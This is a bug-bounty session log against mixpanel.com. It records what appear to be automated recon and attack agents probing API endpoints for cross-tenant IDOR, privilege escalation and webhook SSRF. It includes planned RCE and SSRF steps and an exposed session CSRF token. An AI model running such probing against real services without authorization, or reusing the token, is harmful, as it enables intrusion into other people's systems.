# Mixpanel Hunt — Session Log

## 2026-05-30 — Session 1

### INIT
- Target: mixpanel.com (subdomain enum skipped per user)
- Scope: in_scope=mixpanel.com, *.mixpanel.com; out_of_scope=help/status/blog
- Features: oauth=true, webhooks=true, multi_tenant=true, roles=true, api_keys=true, file_upload=true
- High-priority: cross-account IDOR, API key exposure, webhook SSRF, role escalation

### TOKEN HEALTH
- ADMIN: VALID — session cookie + Authorization: Session scheme
- MEMBER: REFRESHED with user-supplied cookies (csrftoken=Wzyc7HhvlLEDoKIDZIh9CuOIMckNNhvB)
- IDOR: VALID — session cookie

### IDENTITY MAP
| Role   | Org ID  | Role in Org   | Perms | Projects |
|--------|---------|---------------|-------|----------|
| ADMIN  | 3100781 | admin         | 113   | 4025923, 4025962, 4027263, 4027269 |
| MEMBER | 3100781 | **no role**   | **0** | 4025923 (visible only) |
| MEMBER | 3100810 | admin         | 113   | 4025974 |
| IDOR   | 3100795 | admin         | 113   | 4025942 |

### KEY SETUP FOR ATTACKS
- **Cross-tenant (ADMIN ↔ IDOR):** completely different orgs/projects — clean IDOR test
- **Vertical privesc (MEMBER in 3100781):** MEMBER has 0 perms in ADMIN's org — best privesc test
- **Mass assignment:** `/api/app/me` exposes `is_staff: false` field → candidate for PATCH/PUT injection

### ENDPOINTS CONFIRMED (live)
| Endpoint | ADMIN | MEMBER | IDOR | Notes |
|----------|-------|--------|------|-------|
| GET /api/app/me | 200 | 200 | 200 | Returns user + org permissions |
| GET /api/app/projects | 200 | 200 | 200 | Returns user's project list |
| GET /api/app/projects/{pid}/dashboards | 200/302 | TBD | 200/302 | 302→/request_access if no perm |
| GET /api/app/projects/{pid}/cohorts | 200/302 | TBD | 200/302 | Same pattern |

### TESTS COMPLETED
1. **Cross-tenant on /api/app/projects/4025942/dashboards (ADMIN→IDOR proj)**: 302 redirect to /request_access/?next=/
2. **Method overrides (POST/PUT/PATCH/DELETE/OPTIONS)**: All 302 — uniform enforcement
3. **Header tricks (X-Original-URL, X-Rewrite-URL, X-Mixpanel-Project-Id, Referer-switch)**: All blocked (one false positive — X-Original-URL with own-project path returned own-project data, header IGNORED, not bypass)
4. **Path manipulations (double-slash, traversal, semicolon, query override)**: All blocked

### NEGATIVE FINDINGS (saved as not-bugs)
- /api/app/projects/{pid}/dashboards cross-tenant: ENFORCED — no IDOR via standard tricks
- X-Original-URL header injection: silently ignored, NOT a Next.js-style bypass

### PERMISSION HINTS FROM ADMIN/api/app/me (org 3100781, 113 perms)
Notable privileged perms (suggest endpoints):
- write_project_webhooks → /api/app/projects/X/webhooks (SSRF test target)
- view_project_secret → API key disclosure surface
- view_audit_logs → /api/app/audit_logs
- transfer_project → POST /api/app/projects/X/transfer
- delete_project → DELETE /api/app/projects/X
- write_lookup_tables → /api/app/lookup_tables (file upload via CSV)
- write_warehouse_sources → /api/app/warehouse_sources
- import_events → bulk events import
- update_org → org config (target for cross-tenant)
- delete_org → /api/app/organizations/X DELETE
- update_user → user mutation (mass assignment + privesc)
- edit_userroles → role mutation endpoint
- request_gdpr_data → GDPR export (PII access)
- data_deletion → bulk data delete
- reset_api_key → POST /api/app/projects/X/reset_api_key
- reset_project → wipe project
- write_themes, write_dashboards, write_cohorts, write_bookmarks, etc.

### NEXT
- Dispatch recon-endpoints + recon-js to discover full /api/app/* surface
- Dispatch attack-idor for cross-tenant on cohorts, webhooks, lookup_tables, audit_logs, etc.
- Dispatch attack-privesc for MEMBER vertical privesc within org 3100781
- Dispatch attack-rce for file upload (lookup_tables CSV, project import, avatars)
- Dispatch attack-ssrf for webhook URLs
[2026-05-30T18:36:11Z] RECON-ENDPOINTS: STEP 1 begin — fetch SPA shells
[2026-05-30T18:36:12Z] RECON-ENDPOINTS:   https://mixpanel.com/login -> 200 len=23851 body[:120]='<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Login - Mixpanel</title><meta name="robots" content="i'
[2026-05-30T18:36:12Z] RECON-ENDPOINTS:   https://mixpanel.com/p/4025923/dashboards -> 404 len=3098 body[:120]='<!-- KEEP IN SYNC w/ iron/common/widgets/404-screen -->\n<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "'
[2026-05-30T18:36:13Z] RECON-ENDPOINTS:   https://mixpanel.com/p/4025923/insights -> 404 len=3098 body[:120]='<!-- KEEP IN SYNC w/ iron/common/widgets/404-screen -->\n<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "'
[2026-05-30T18:36:13Z] RECON-ENDPOINTS:   https://mixpanel.com/p/4025923/settings -> 404 len=3098 body[:120]='<!-- KEEP IN SYNC w/ iron/common/widgets/404-screen -->\n<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "'
[2026-05-30T18:36:14Z] RECON-ENDPOINTS:   https://mixpanel.com/p/4025923/users -> 404 len=3098 body[:120]='<!-- KEEP IN SYNC w/ iron/common/widgets/404-screen -->\n<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "'
[2026-05-30T18:36:14Z] RECON-ENDPOINTS:   https://mixpanel.com/organizations/3100781 -> 404 len=65 body[:120]='{"status": "error", "error": "Not found: /organizations/3100781"}'
[2026-05-30T18:36:14Z] RECON-ENDPOINTS:   total candidate JS URLs: 19
[2026-05-30T18:36:46Z] RECON-ENDPOINTS: STEP 1b — try real SPA entry paths
[2026-05-30T18:36:47Z] RECON-ENDPOINTS:   https://mixpanel.com/report -> 301 loc=/report/ len=0
[2026-05-30T18:36:47Z] RECON-ENDPOINTS:   https://mixpanel.com/report/4025923 -> 301 loc=/report/4025923/ len=0
[2026-05-30T18:36:47Z] RECON-ENDPOINTS:   https://mixpanel.com/report/4025923/dashboards -> 302 loc=https://mixpanel.com/project/4025923/app/boards len=138
[2026-05-30T18:36:48Z] RECON-ENDPOINTS:   https://mixpanel.com/report/4025923/insights -> 302 loc=https://mixpanel.com/project/4025923/app/insights len=138
[2026-05-30T18:36:48Z] RECON-ENDPOINTS:   https://mixpanel.com/report/4025923/settings -> 302 loc=https://mixpanel.com/project/4025923/app/settings len=138
[2026-05-30T18:36:49Z] RECON-ENDPOINTS:   https://mixpanel.com/project/4025923 -> 301 loc=/project/4025923/ len=0
[2026-05-30T18:36:50Z] RECON-ENDPOINTS:   https://mixpanel.com/projects -> 301 loc=/projects/ len=0
[2026-05-30T18:36:50Z] RECON-ENDPOINTS:   https://mixpanel.com/account -> 301 loc=/account/ len=0
[2026-05-30T18:36:51Z] RECON-ENDPOINTS:   https://mixpanel.com/home -> 308 loc=/home/ len=42
[2026-05-30T18:36:51Z] RECON-ENDPOINTS:   new candidate JS URLs: 0
[18:37:10] ATTACK-PRIVESC: === PHASE 1: READ-ONLY PRIVESC START ===
[18:37:10] ATTACK-PRIVESC: sanity /api/app/me ADMIN: 200 len=20937
[18:37:11] ATTACK-PRIVESC: sanity /api/app/me MEMBER: 200 len=8956
[18:37:12] ATTACK-PRIVESC: sanity /api/app/me IDOR: 200 len=7288
[18:37:13] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4025962/dashboards: MEMBER=200/31086 ADMIN=200/811 [PARTIAL]
[18:37:14] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4027263/dashboards: MEMBER=200/31086 ADMIN=200/811 [PARTIAL]
[18:37:15] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4027269/dashboards: MEMBER=200/31086 ADMIN=200/811 [PARTIAL]
[18:37:16] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4025923/dashboards: MEMBER=200/794 ADMIN=200/811 [PRIVESC-MATCH]
[18:37:16] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/organizations/3100781/audit_logs: MEMBER=404/84 ADMIN=404/84 
[18:37:17] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/organizations/3100781/members: MEMBER=404/81 ADMIN=404/81 
[18:37:18] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/organizations/3100781/billing: MEMBER=404/81 ADMIN=404/81 
[18:37:20] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/organizations/3100781: MEMBER=404/73 ADMIN=404/73 
[18:37:21] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4025923/secret: MEMBER=404/75 ADMIN=404/75 
[18:37:21] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4025923/api-key: MEMBER=404/76 ADMIN=404/76 
[18:37:23] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4025923/users: MEMBER=404/74 ADMIN=404/74 
[18:37:24] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4025923: MEMBER=404/68 ADMIN=404/68 
[18:37:24] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4025923/info: MEMBER=404/73 ADMIN=404/73 
[2026-05-30T18:37:25Z] RECON-ENDPOINTS: STEP 1c — fetch real SPA shells at /project/<pid>/app/*
[18:37:26] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4025923/webhooks: MEMBER=200/31 ADMIN=200/31 [PRIVESC-MATCH]
[2026-05-30T18:37:26Z] RECON-ENDPOINTS:   https://mixpanel.com/project/4025923/app/boards -> 200 final=https://mixpanel.com/request_access/?next=/project/4025923/app/boards len=31086
[18:37:26] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4025923/settings: MEMBER=404/77 ADMIN=404/77 
[2026-05-30T18:37:28Z] RECON-ENDPOINTS:   https://mixpanel.com/project/4025923/app/insights -> 200 final=https://mixpanel.com/request_access/?next=/project/4025923/app/insights len=31086
[2026-05-30T18:37:28Z] RECON-ENDPOINTS:   https://mixpanel.com/project/4025923/app/settings -> 200 final=https://mixpanel.com/request_access/?next=/project/4025923/app/settings len=31086
[2026-05-30T18:37:29Z] RECON-ENDPOINTS:   https://mixpanel.com/project/4025923/app/users -> 200 final=https://mixpanel.com/request_access/?next=/project/4025923/app/users len=31086
[18:37:29] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4025923/keys: MEMBER=404/73 ADMIN=404/73 
[18:37:30] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4025962: MEMBER=404/68 ADMIN=404/68 
[2026-05-30T18:37:30Z] RECON-ENDPOINTS:   https://mixpanel.com/project/4025923/app/cohorts -> 404 final=https://mixpanel.com/project/4025923/app/cohorts len=3098
[18:37:32] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4025962/secret: MEMBER=404/75 ADMIN=404/75 
[2026-05-30T18:37:32Z] RECON-ENDPOINTS:   https://mixpanel.com/project/4025923/app/lexicon -> 200 final=https://mixpanel.com/request_access/?next=/project/4025923/app/lexicon len=31086
[18:37:33] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4025962/api-key: MEMBER=404/76 ADMIN=404/76 
[2026-05-30T18:37:34Z] RECON-ENDPOINTS:   https://mixpanel.com/project/4025923/app/webhooks -> 404 final=https://mixpanel.com/project/4025923/app/webhooks len=3098
[18:37:35] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4025962/users: MEMBER=404/74 ADMIN=404/74 
[18:37:36] ATTACK-PRIVESC: GET https://mixpanel.com/api/app/projects/4025962/info: MEMBER=404/73 ADMIN=404/73 
[2026-05-30T18:37:36Z] RECON-ENDPOINTS:   https://mixpanel.com/project/4025923/app/settings/account -> 200 final=https://mixpanel.com/request_access/?next=/project/4025923/app/settings/account len=31086
[2026-05-30T18:37:37Z] RECON-ENDPOINTS:   https://mixpanel.com/project/4025923/app/settings/organization -> 200 final=https://mixpanel.com/request_access/?next=/project/4025923/app/settings/organization len=31086
[2026-05-30T18:37:37Z] RECON-ENDPOINTS:   https://mixpanel.com/project/4025923/app/settings/project -> 200 final=https://mixpanel.com/request_access/?next=/project/4025923/app/settings/project len=31086
[2026-05-30T18:37:38Z] RECON-ENDPOINTS:   https://mixpanel.com/account/ -> 200 final=https://mixpanel.com/login/?next=/settings/account len=23851
[2026-05-30T18:37:38Z] RECON-ENDPOINTS:   https://mixpanel.com/projects/ -> 200 final=https://mixpanel.com/login/?next=/report/ len=23851
[2026-05-30T18:37:39Z] RECON-ENDPOINTS:   https://mixpanel.com/home/ -> 200 final=https://mixpanel.com/home/ len=1124686
[2026-05-30T18:37:39Z] RECON-ENDPOINTS:   STEP 1c yielded 22 additional JS URLs (total: 23)
[18:37:40] ATTACK-SSRF: === Begin webhook surface enumeration ===
[18:37:40] ATTACK-SSRF: GET /api/app/projects/4025923/webhooks → 200 (31 bytes)
[18:37:40] ATTACK-SSRF: GET /api/app/projects/4025923/cohort_webhooks → 404 (84 bytes)
[18:37:41] ATTACK-SSRF: GET /api/app/projects/4025923/integrations → 405 (0 bytes)
[18:37:41] ATTACK-SSRF: GET /api/app/projects/4025923/integrations/webhooks → 404 (90 bytes)
[18:37:42] ATTACK-SSRF: GET /api/app/projects/4025923/custom_alerts → 404 (82 bytes)
[18:37:42] ATTACK-SSRF: GET /api/app/projects/4025923/alerts → 404 (75 bytes)
[18:37:43] ATTACK-SSRF: GET /api/app/projects/4025923/warehouse_sources → 404 (86 bytes)
[18:37:43] ATTACK-IDOR: BEGIN session. ADMIN_PROJ=4025923, IDOR_PROJ=4025942, MEMBER_PROJ=4025974
[18:37:44] ATTACK-IDOR: BASELINE ADMIN own project dashboards: 200 len=811
[18:37:44] ATTACK-SSRF: GET /api/app/projects/4025923/warehouse_connectors → 404 (89 bytes)
[18:37:44] ATTACK-SSRF: GET /api/app/projects/4025923/data_pipelines → 404 (83 bytes)
[18:37:45] ATTACK-SSRF: GET /api/app/projects/4025923/exports → 404 (76 bytes)
[18:37:45] ATTACK-SSRF: GET /api/app/projects/4025923/destinations → 404 (81 bytes)
[18:37:46] ATTACK-IDOR: BASELINE IDOR own project dashboards: 200 len=811
[18:37:46] ATTACK-SSRF: GET /api/app/projects/4025923/cohorts → 200 (31 bytes)
[18:37:47] ATTACK-IDOR: BASELINE MEMBER own project dashboards: 200 len=811
[18:37:47] ATTACK-SSRF: GET /api/app/projects/4025923/cohort/sync → 404 (80 bytes)
[18:37:48] ATTACK-SSRF: GET /api/app/projects/4025923/cohort_syncs → 404 (81 bytes)
[18:37:48] ATTACK-SSRF: GET /api/app/projects/4025923/notification_services → 404 (90 bytes)
[18:37:49] ATTACK-SSRF: GET /api/app/projects/4025923/notifications → 404 (82 bytes)
[18:37:49] ATTACK-SSRF: GET /api/2.0/cohort_webhooks → 400 (86 bytes)
[18:37:50] ATTACK-SSRF: GET /api/2.0/webhooks → 400 (79 bytes)
[18:37:51] ATTACK-SSRF: GET /api/app/projects/4025923/sources → 404 (76 bytes)
[18:37:52] ATTACK-SSRF: GET /api/app/projects/4025923/connections → 404 (80 bytes)
[18:38:07] ATTACK-SSRF: GET /api/2.0/cohort_webhooks?project_id=4025923 → 400 body[150]={"request": "/api/2.0/cohort_webhooks?project_id=4025923", "error": "Invalid API endpoint"}
[18:38:08] ATTACK-SSRF: GET /api/2.0/webhooks?project_id=4025923 → 400 body[150]={"request": "/api/2.0/webhooks?project_id=4025923", "error": "Invalid API endpoint"}
[18:38:09] ATTACK-SSRF: OPTIONS /api/app/projects/4025923/integrations → 405 Allow=POST
[18:38:10] ATTACK-SSRF: OPTIONS /api/app/projects/4025923/webhooks → 405 Allow=GET, POST
[18:38:10] ATTACK-IDOR: BASELINE ADMIN own project bookmarks: 200 len=23487
[18:38:11] ATTACK-IDOR: BASELINE IDOR own project bookmarks: 200 len=23487
[18:38:12] ATTACK-IDOR: BASELINE MEMBER own project bookmarks: 200 len=23461
[18:38:26] ATTACK-SSRF: POST /webhooks shape=['url'] → 400 {"status": "error", "error": "root: &#x27;name&#x27; is a required property", "details": {"schema": {"additionalProperties": false, "description": "Payload for creating a new webhook configuration.", 
[2026-05-30T18:38:27Z] RECON-ENDPOINTS:   /api/app/me -> 200 len=20937 body[:80]='{"status": "ok", "results": {"date_joined_iso": "2026-05-19T13:06:10", "is_staff'
[18:38:27] ATTACK-SSRF: POST /webhooks shape=['webhook_url'] → 400 {"status": "error", "error": "root: Additional properties are not allowed (&#x27;webhook_url&#x27; was unexpected)&#x27;name&#x27; is a required property\n&#x27;url&#x27; is a required property", "det
[18:38:28] ATTACK-SSRF: POST /webhooks shape=['name', 'url'] → 200 {"status": "ok", "results": {"id": "3b82f560-d587-4b8f-9c71-f35ae4d092c8", "name": "test"}}
[2026-05-30T18:38:28Z] RECON-ENDPOINTS:   https://mixpanel.com/project/4025923/app/boards no-redir -> 302 loc=https://mixpanel.com/request_access/?next=/project/4025923/app/boards len=138
[2026-05-30T18:38:28Z] RECON-ENDPOINTS:     body[:300]='<html>\r\n<head><title>302 Found</title></head>\r\n<body>\r\n<center><h1>302 Found</h1></center>\r\n<hr><center>nginx</center>\r\n</body>\r\n</html>\r\n'
[2026-05-30T18:38:28Z] RECON-ENDPOINTS:   https://mixpanel.com/app/4025923/ -> 404 loc=- len=3098
[18:38:29] ATTACK-SSRF: POST /webhooks shape=['name', 'endpoint'] → 400 {"status": "error", "error": "root: Additional properties are not allowed (&#x27;endpoint&#x27; was unexpected)&#x27;url&#x27; is a required property", "details": {"schema": {"additionalProperties": f
[2026-05-30T18:38:31Z] RECON-ENDPOINTS:   https://mixpanel.com/app/ -> 404 loc=- len=3098
[18:38:32] ATTACK-SSRF: POST /webhooks shape=['target_url'] → 400 {"status": "error", "error": "root: Additional properties are not allowed (&#x27;target_url&#x27; was unexpected)&#x27;name&#x27; is a required property\n&#x27;url&#x27; is a required property", "deta
[2026-05-30T18:38:32Z] RECON-ENDPOINTS:   https://mixpanel.com/dashboard/ -> 404 loc=- len=3098
[18:38:34] ATTACK-SSRF: POST /webhooks shape=['hook_url'] → 400 {"status": "error", "error": "root: Additional properties are not allowed (&#x27;hook_url&#x27; was unexpected)&#x27;name&#x27; is a required property\n&#x27;url&#x27; is a required property", "detail
[2026-05-30T18:38:34Z] RECON-ENDPOINTS:   https://mixpanel.com/report/4025923/dashboard/ -> 302 loc=https://mixpanel.com/project/4025923/app/boards len=138
[18:38:35] ATTACK-SSRF: POST /webhooks shape=['callback_url'] → 400 {"status": "error", "error": "root: Additional properties are not allowed (&#x27;callback_url&#x27; was unexpected)&#x27;name&#x27; is a required property\n&#x27;url&#x27; is a required property", "de
[2026-05-30T18:38:36Z] RECON-ENDPOINTS:   https://mixpanel.com/p/4025923/ -> 404 loc=- len=3098
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:   https://mixpanel.com/projects/4025923 -> 404 loc=- len=3098
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:   /report/4025923/dashboards followed -> 200 final=https://mixpanel.com/request_access/?next=/project/4025923/app/boards len=31086
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     body[:300]='<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Request Access - Mixpanel</title><meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1"><meta name="description" content="Learn how people use your product with the world\'s most advanced'
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:   spa-final-shell asset hits: 18
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.optimizely.com/js/5838709522694144.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://consent.trustarc.com/v2/autoblockasset/core.min.js?cmId=9iv2en
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/polyfills-42372ed130431b0a.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/webpack-df1e720a3aa0a77d.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/framework-d57fa332274b7d65.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/main-29771fd7f201b0cc.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/pages/_app-30065074a8f69b05.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/2757-d165f8d3e51344ab.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/9894-da6b07bdbd79277c.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/8624-31c05e9fe735a949.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/6134-e44b3c7320d7d4fd.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/5570-6e6d2238b87d8c56.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/5581-049bd50141a7e823.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/2288-823df22a3fde6cc4.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/7162-cee10e4c92394489.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/chunks/pages/new-request_access-eca8a39a822a894a.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/PnPwvjnvq63Fmno_i7oMq/_buildManifest.js
[2026-05-30T18:38:37Z] RECON-ENDPOINTS:     JS: https://cdn.mxpnl.com/marketing-site/static/_next/static/PnPwvjnvq63Fmno_i7oMq/_ssgManifest.js
[18:38:38] ATTACK-SSRF: POST /webhooks shape=['destination'] → 400 {"status": "error", "error": "root: Additional properties are not allowed (&#x27;destination&#x27; was unexpected)&#x27;name&#x27; is a required property\n&#x27;url&#x27; is a required property", "det
[18:38:39] ATTACK-SSRF: POST /webhooks form shape=['url'] → 400 {"status": "error", "error": "Invalid JSON body"}
[18:38:40] ATTACK-SSRF: POST /webhooks form shape=['webhook_url'] → 400 {"status": "error", "error": "Invalid JSON body"}
[18:38:42] ATTACK-SSRF: POST /webhooks form shape=['name', 'url'] → 400 {"status": "error", "error": "Invalid JSON body"}
[2026-05-30T18:38:59Z] RECON-ENDPOINTS:   NAV https://mixpanel.com/project/4025923/app/boards -> 302 loc=https://mixpanel.com/request_access/?next=/project/4025923/app/boards len=138
[2026-05-30T18:38:59Z] RECON-ENDPOINTS:     cookies set: []
[2026-05-30T18:39:00Z] RECON-ENDPOINTS:   NAV https://mixpanel.com/explore/4025923 -> 404 loc=- len=3098
[2026-05-30T18:39:00Z] RECON-ENDPOINTS:   NAV https://mixpanel.com/insights/4025923 -> 404 loc=- len=3098
[2026-05-30T18:39:01Z] RECON-ENDPOINTS:   NAV https://mixpanel.com/dashboard/ -> 404 loc=- len=3098
[2026-05-30T18:39:01Z] RECON-ENDPOINTS:   NAV https://mixpanel.com/account/profile -> 404 loc=- len=3098
[2026-05-30T18:39:02Z] RECON-ENDPOINTS:   NAV https://mixpanel.com/settings/account -> 302 loc=/project/4025923/app/settings/account len=0
[2026-05-30T18:39:03Z] RECON-ENDPOINTS:   NAV https://mixpanel.com/settings/organization/3100781 -> 404 loc=- len=3098
[2026-05-30T18:39:04Z] RECON-ENDPOINTS:   NAV https://mixpanel.com/settings/project/4025923 -> 302 loc=/project/4025923/app/settings/project len=0
[2026-05-30T18:39:05Z] RECON-ENDPOINTS:   NAV https://mixpanel.com/iron/ -> 404 loc=- len=3098
[18:39:18] ATTACK-PRIVESC: GET /api/app/projects/4025923/secret: MEMBER=404/75 ADMIN=404/75 
[18:39:21] ATTACK-PRIVESC: GET /api/2.0/projects/4025923/secret: MEMBER=400/94 ADMIN=400/94 
[18:39:25] ATTACK-PRIVESC: GET /api/app/projects/4025923/api_secret: MEMBER=404/79 ADMIN=404/79 
[18:39:28] ATTACK-PRIVESC: GET /api/app/organizations/3100781/audit_logs: MEMBER=404/84 ADMIN=404/84 
[2026-05-30T18:39:30Z] RECON-ENDPOINTS:   PROBE /static/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[18:39:30] ATTACK-PRIVESC: GET /api/app/organizations/3100781/audit-logs: MEMBER=405/0 ADMIN=405/0 
[18:39:33] ATTACK-PRIVESC: GET /api/2.0/orgs/3100781/audit_logs: MEMBER=400/94 ADMIN=400/94 
[2026-05-30T18:39:35Z] RECON-ENDPOINTS:   PROBE /static/app/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:39:35Z] RECON-ENDPOINTS:   PROBE /static/mp/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[18:39:37] ATTACK-PRIVESC: GET /api/app/organizations/3100781/users: MEMBER=404/79 ADMIN=404/79 
[2026-05-30T18:39:39Z] RECON-ENDPOINTS:   PROBE /static/dist/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:39:39Z] RECON-ENDPOINTS:   PROBE /static/mp-app/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[18:39:41] ATTACK-PRIVESC: GET /api/app/organizations/3100781/projects: MEMBER=404/82 ADMIN=404/82 
[2026-05-30T18:39:41Z] RECON-ENDPOINTS:   PROBE /static/dashboard/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:39:42Z] RECON-ENDPOINTS:   PROBE /static/spa/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:39:42Z] RECON-ENDPOINTS:   PROBE /site_media/ -> 403 loc=- ct=text/html len=548
[2026-05-30T18:39:42Z] RECON-ENDPOINTS:   PROBE /site_media/app.js -> 404 loc=- ct=text/html len=548
[18:39:43] ATTACK-PRIVESC: GET /api/app/orgs/3100781/users: MEMBER=404/70 ADMIN=404/70 
[2026-05-30T18:39:44Z] RECON-ENDPOINTS:   PROBE /site_media/js/ -> 403 loc=- ct=text/html len=548
[2026-05-30T18:39:45Z] RECON-ENDPOINTS:   PROBE /static/manifest.json -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[18:39:46] ATTACK-PRIVESC: GET /api/app/orgs/3100781/projects: MEMBER=404/73 ADMIN=404/73 
[18:39:47] ATTACK-PRIVESC: GET /api/app/organizations/3100781/usage: MEMBER=404/79 ADMIN=404/79 
[2026-05-30T18:39:48Z] RECON-ENDPOINTS:   PROBE /manifest.json -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[18:39:49] ATTACK-PRIVESC: GET /api/app/projects/4025923/api_keys: MEMBER=404/77 ADMIN=404/77 
[18:39:51] ATTACK-PRIVESC: GET /api/app/projects/4025923/tokens: MEMBER=404/75 ADMIN=404/75 
[2026-05-30T18:39:53Z] RECON-ENDPOINTS:   PROBE /asset-manifest.json -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:39:53Z] RECON-ENDPOINTS:   PROBE /static/js/main.js -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:39:54Z] RECON-ENDPOINTS:   PROBE /static/mp/app.js -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[18:39:55] ATTACK-PRIVESC: GET /api/app/projects/4025923/service_accounts: MEMBER=404/85 ADMIN=404/85 
[2026-05-30T18:39:57Z] RECON-ENDPOINTS:   PROBE /static/static/main.js -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[18:39:58] ATTACK-PRIVESC: GET /api/app/projects/4025923/roles: MEMBER=404/74 ADMIN=404/74 
[2026-05-30T18:40:00Z] RECON-ENDPOINTS:   PROBE /static/iron/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:40:01Z] RECON-ENDPOINTS:   PROBE /static/iron/app.js -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[18:40:02] ATTACK-PRIVESC: GET /api/app/projects/4025923/userroles: MEMBER=404/78 ADMIN=404/78 
[18:40:03] ATTACK-PRIVESC: GET /api/app/organizations/3100781/roles: MEMBER=404/79 ADMIN=404/79 
[2026-05-30T18:40:05Z] RECON-ENDPOINTS:   PROBE /static/mixpanel-app/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:40:06Z] RECON-ENDPOINTS:   PROBE /static/web-app/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
[2026-05-30T18:40:07Z] RECON-ENDPOINTS:   PROBE /site_media/mp.js -> 404 loc=- ct=text/html len=548
[18:40:08] ATTACK-PRIVESC: GET /api/app/organizations/3100781/custom_roles: MEMBER=404/86 ADMIN=404/86 
[2026-05-30T18:40:09Z] RECON-ENDPOINTS:   PROBE /site_media/dist/ -> 404 loc=- ct=text/html len=548
[2026-05-30T18:40:09Z] RECON-ENDPOINTS:   PROBE /site_media/dist/main.js -> 404 loc=- ct=text/html len=548
[2026-05-30T18:40:10Z] RECON-ENDPOINTS:   PROBE /site_media/dist/main.bundle.js -> 404 loc=- ct=text/html len=548
[18:40:11] ATTACK-PRIVESC: GET /api/app/projects/4025923/settings: MEMBER=404/77 ADMIN=404/77 
[2026-05-30T18:40:12Z] RECON-ENDPOINTS:   PROBE /m/site_media/ -> 404 loc=- ct=text/html; charset=UTF-8 len=0
[2026-05-30T18:40:12Z] RECON-ENDPOINTS:   PROBE /embed/ -> 404 loc=- ct=text/html; charset=utf-8 len=3098
